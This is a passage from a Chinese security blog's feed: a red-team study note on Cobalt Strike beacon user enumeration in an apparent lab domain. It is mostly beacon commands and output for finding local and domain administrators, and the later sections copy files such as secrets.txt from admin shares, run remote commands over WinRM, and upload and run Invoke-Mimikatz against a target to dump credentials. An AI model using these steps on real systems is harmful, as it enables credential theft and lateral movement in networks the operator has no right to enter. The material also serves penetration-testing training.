href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】16、用户枚举三个关键步骤</title>
      <link href="//200419-150615.html"/>
      <url>//200419-150615.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>用户枚举的三个关键步骤：</p><p>1、当前账号是否为管理员账号？</p><p>2、哪些账号是域管理员账号？</p><p>3、哪个账号是这个系统上的本地管理员账号？</p><h1 id="0x01-管理员账号"><a href="#0x01-管理员账号" class="headerlink" title="0x01 管理员账号"></a>0x01 管理员账号</h1><p>第一个关键步骤，发现管理员账号。</p><p>如果想知道自己是否为管理员账号，可以尝试运行一些只有管理员账号才有权限操作的命令，然后通过返回结果判断是否为管理员。</p><p>其中一种方式是尝试列出仅仅只有管理员才能查看的共享列表，比如下面的 <code>dir \\host\C$</code> 命令，如果可以看到一个文件列表，那么说明可能拥有本地管理员权限。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">dir</span> \\host\C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#管理员账号运行结果</span>beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P26AK33U871\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P26AK33U871\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output: 驱动器 \\WIN<span class="token operator">-</span>P26AK33U871\C$ 中的卷没有标签。 卷的序列号是 F269<span class="token operator">-</span>89A7 \\WIN<span class="token operator">-</span>P26AK33U871\C$ 的目录2020<span class="token operator">/</span>06<span class="token operator">/</span>24  09:29    &lt;<span class="token function">DIR</span>>          inetpub2009<span class="token operator">/</span>07<span class="token operator">/</span>14  11:20    &lt;<span class="token function">DIR</span>>          PerfLogs2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows               0 个文件              0 字节               6 个目录 28<span class="token punctuation">,</span>500<span class="token punctuation">,</span>807<span class="token punctuation">,</span>680 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#一般账号运行结果</span>beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>72A8ERDSF2P\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>72A8ERDSF2P\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以运行其他命令，比如运行下面的 <code>at</code> 命令来查看系统上的计划任务列表，如果显示出了任务列表信息，那么可能是本地管理员。（当任务列表没有信息时会返回 “列表是空的” 提示）</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell at \\host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#管理员账号运行结果</span>beacon> shell at \\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: at \\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 51 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:状态 ID     日期                    时间          命令行<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>        1   今天                    22:30         E:\Install\Thunder\Thunder<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#一般账号运行结果</span>beacon> shell at \\WIN<span class="token operator">-</span>72A8ERDSF2P<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: at \\WIN<span class="token operator">-</span>72A8ERDSF2P<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 51 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一节讲述的 <code>PowerView</code> 有很多很好的自动操作来帮助解决这些问题。可以在加载 <code>PowerView</code> 后，运行下面的命令，通过 <code>PowerView</code> 可以快速找到管理员账号。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">Find-LocalAdminAccess</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell<span class="token operator">-</span>import powerview<span class="token punctuation">.</span>ps1<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to import: powerview<span class="token punctuation">.</span>ps1<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 101224 bytesbeacon> powershell <span class="token function">Find-LocalAdminAccess</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Find-LocalAdminAccess</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 329 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:WIN<span class="token operator">-</span>P26AK33U871<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-域管理员账号"><a href="#0x02-域管理员账号" class="headerlink" title="0x02 域管理员账号"></a>0x02 域管理员账号</h1><p>第二个关键步骤，发现域管理员账号。</p><h2 id="列出域管理员"><a href="#列出域管理员" class="headerlink" title="列出域管理员"></a>列出域管理员</h2><p>对于发现域管理员账号，可以在共享里使用本地的Windows命令。运行以下两条命令可以用来找出这些“域群组”的成员。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net <span class="token function">group</span> <span class="token string">"enterprise admins"</span> <span class="token operator">/</span>DOMAINnet <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>DOMAIN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net <span class="token function">group</span> <span class="token string">"enterprise admins"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net <span class="token function">group</span> <span class="token string">"enterprise admins"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 68 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:组名     Enterprise Admins注释     企业的指定系统管理员成员<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>Administrator            命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 64 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:组名     Domain Admins注释     指定的域管理员成员<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>Administrator            命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者运行下面的命令来看谁是域控制器上的管理员</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup <span class="token string">"administrators"</span> <span class="token operator">/</span>DOMAIN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net localgroup <span class="token string">"administrators"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net localgroup <span class="token string">"administrators"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 70 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:别名     administrators注释     管理员对计算机<span class="token operator">/</span>域有不受限制的完全访问权成员<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>administratorDomain AdminsDanielEnterprise Admins命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="net-模块"><a href="#net-模块" class="headerlink" title="net 模块"></a>net 模块</h2><p>beacon 的 net 模块也可以帮助我们，下面的命令中 <code>TARGET</code> 的意思是一个域控制器或者是任何想查看的组名，比如企业管理员、域管理员等等</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net <span class="token function">group</span> \\TARGET <span class="token function">group</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以运行下面的命令，这会连接任意目标来获取列表</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup \\TARGET <span class="token function">group</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x03-本地管理员"><a href="#0x03-本地管理员" class="headerlink" title="0x03 本地管理员"></a>0x03 本地管理员</h1><h2 id="net-模块-1"><a href="#net-模块-1" class="headerlink" title="net 模块"></a>net 模块</h2><p>本地管理员可能是一个域账户，因此如果想把一个系统作为目标，应该找到谁是这个系统的本地管理员，因为如果获得了它的密码哈希值或者凭据就可以伪装成那个用户。</p><p>beacon 的 net 模块可以在系统上从一个没有特权的关联中查询本地组和用户。</p><p>在 beacon 控制台中运行下面命令可以获得一个目标上的群组列表</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup \\TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想获取群组的列表，可运行下面的命令来获得一个群组成员的名单列表。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup \\TARGET <span class="token function">group</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> net localgroup \\WIN<span class="token operator">-</span>P26AK33U871 administrators<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run net localgroup administrators on WIN<span class="token operator">-</span>P26AK33U871<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 104510 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:Members of administrators on \\WIN<span class="token operator">-</span>P26AK33U871:TEAMSSIX\AdministratorTEAMSSIX\DanielTEAMSSIX\Enterprise AdminsTEAMSSIX\Domain Admins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PowerView-模块"><a href="#PowerView-模块" class="headerlink" title="PowerView 模块"></a>PowerView 模块</h2><p>PowerView 使用下面的命令能够在一个主机上找到本地管理员，这条命令实际上通过管理员群组找到同样的群组并且把成员名单返回出来。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-Netlocalgroup</span> <span class="token operator">-</span>hostname TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">Get-Netlocalgroup</span> <span class="token operator">-</span>Hostname WIN<span class="token operator">-</span>P26AK33U871<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Get-Netlocalgroup</span> <span class="token operator">-</span>Hostname WIN<span class="token operator">-</span>P26AK33U871<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 385 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:ComputerName : WIN<span class="token operator">-</span>P26AK33U871AccountName  : teamssix<span class="token punctuation">.</span>com<span class="token operator">/</span>AdministratorIsDomain     : TrueIsGroup      : FalseSID          : S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>22<span class="token operator">-</span>3301978333<span class="token operator">-</span>983314215<span class="token operator">-</span>684642015<span class="token operator">-</span>500Description  : Disabled     : LastLogin    : 2020<span class="token operator">/</span>8<span class="token operator">/</span>17 22:21:23PwdLastSet   : PwdExpired   : UserFlags    : ComputerName : WIN<span class="token operator">-</span>P26AK33U871AccountName  : teamssix<span class="token punctuation">.</span>com<span class="token operator">/</span>Daniel……内容过多，余下部分省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x04-无需恶意软件"><a href="#0x04-无需恶意软件" class="headerlink" title="0x04 无需恶意软件"></a>0x04 无需恶意软件</h1><p>如果一个系统信任我们为本地管理员权限，那么我们可以在那个系统上干什么呢？</p><h2 id="1、查看共享文件"><a href="#1、查看共享文件" class="headerlink" title="1、查看共享文件"></a>1、查看共享文件</h2><p>比如我们可以通过运行下面的命令来列出 C:\foo 的共享文件</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">dir</span> \\host\C$\foo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output: 驱动器 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 中的卷没有标签。 卷的序列号是 F269<span class="token operator">-</span>89A7 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 的目录2020<span class="token operator">/</span>06<span class="token operator">/</span>24  09:29    &lt;<span class="token function">DIR</span>>          inetpub2009<span class="token operator">/</span>07<span class="token operator">/</span>14  11:20    &lt;<span class="token function">DIR</span>>          PerfLogs2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows               0 个文件              0 字节               6 个目录 28<span class="token punctuation">,</span>500<span class="token punctuation">,</span>393<span class="token punctuation">,</span>984 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、复制文件"><a href="#2、复制文件" class="headerlink" title="2、复制文件"></a>2、复制文件</h2><p>比如运行下面的命令将 <code>secrets.txt</code>文件复制到当前目录。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">copy</span> \\host\C$\foo\secrets<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">copy</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\foo\secrets<span class="token punctuation">.</span>txt<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">copy</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\foo\secrets<span class="token punctuation">.</span>txt<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 93 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:已复制         1 个文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、查看文件列表"><a href="#3、查看文件列表" class="headerlink" title="3、查看文件列表"></a>3、查看文件列表</h2><p>比如运行下面的命令。其中 /S 表示列出指定目录及子目录所有文件，/B 表示使用空格式，即没有标题或摘要信息。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">dir</span> <span class="token operator">/</span>S <span class="token operator">/</span>B \\host\C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> <span class="token operator">/</span>S <span class="token operator">/</span>B \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> <span class="token operator">/</span>S <span class="token operator">/</span>B \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 67 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\Classic <span class="token punctuation">.</span>NET AppPool\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\Daniel\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\Public\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\Contacts\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\Desktop\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\Documents\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\Downloads\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\Favorites……内容过多，余下部分省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、使用-WinRM-运行命令"><a href="#4、使用-WinRM-运行命令" class="headerlink" title="4、使用 WinRM 运行命令"></a>4、使用 WinRM 运行命令</h2><p>WinRM 运行在 5985 端口上，WinRM 是 Windows 远程管服务，使用 WinRM 可以使远程管理更容易一些。</p><p>如果想利用 WinRM 运行命令则可以使用下面的命令。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName TARGET <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>command here<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName WIN<span class="token operator">-</span>P2AASSD1AF1 <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span> net localgroup administrators<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName WIN<span class="token operator">-</span>P2AASSD1AF1 <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span> net localgroup administrators<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 303 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:别名     administrators注释     管理员对计算机<span class="token operator">/</span>域有不受限制的完全访问权成员<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>AdministratorDomain AdminsDanielEnterprise Admins命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：如果命令运行失败可能是因为 WinRM 配置原因，可在 powershell 环境下运行 <code>winrm quickconfig</code>命令，输入 <code>y</code> 回车即可。</p><p>命令运行后的结果，WinRM 也将通过命令行进行显示，因此可以使用 Powershell 的 Invoke 命令来作为远程工具，而不使用其他的恶意软件来控制系统。</p><h2 id="5、通过-WinRM-运行-Mimikatz"><a href="#5、通过-WinRM-运行-Mimikatz" class="headerlink" title="5、通过 WinRM 运行 Mimikatz"></a>5、通过 WinRM 运行 Mimikatz</h2><p>更进一步，甚至可以使用 PowerSploit 来通过 WinRM 运行 Mimikatz，只需要先导入 Invoke-Mimikatz.ps1 文件，再执行以下命令即可。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token operator">-</span>import <span class="token operator">/</span>path<span class="token operator">/</span>to<span class="token operator">/</span><span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1powershell <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>注：之前提了很多次的 PowerView 也是 PowerSploit 项目里众多 ps1 文件之一，Mimikatz 的 ps1 文件在 PowerSploit 项目的 Exfiltration 目录下，PowerSploit 项目下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p></blockquote><p>因为 beacon 上传文件大小限制在1MB，而 Invoke-Mimikatz.ps1 文件大小在 2 MB 多，因此直接运行 <code>powershell-import</code> 导入该文件会报错，这里可以选择使用 beacon 中的 upload 命令或者在当前会话的 File Browser 图形界面中上传该文件。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">upload C:\path\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传之后通过 dir 命令可以查看到文件被上传到了C盘下，之后可以运行以下命令来导入该文件。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">import-module</span> C:\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后再运行以下命令就能通过 WinRM 执行 Mimikatz 了。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果提示<code>无法将“Invoke-Mimikatz”项识别为 cmdlet、函数……</code>，则可以将两条命令以分号合并在一起运行，即：</p><pre class="line-numbers language-none"><code class="language-none">powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">import-module</span> C:\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token punctuation">;</span> <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">import-module</span> C:\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token punctuation">;</span> <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 287 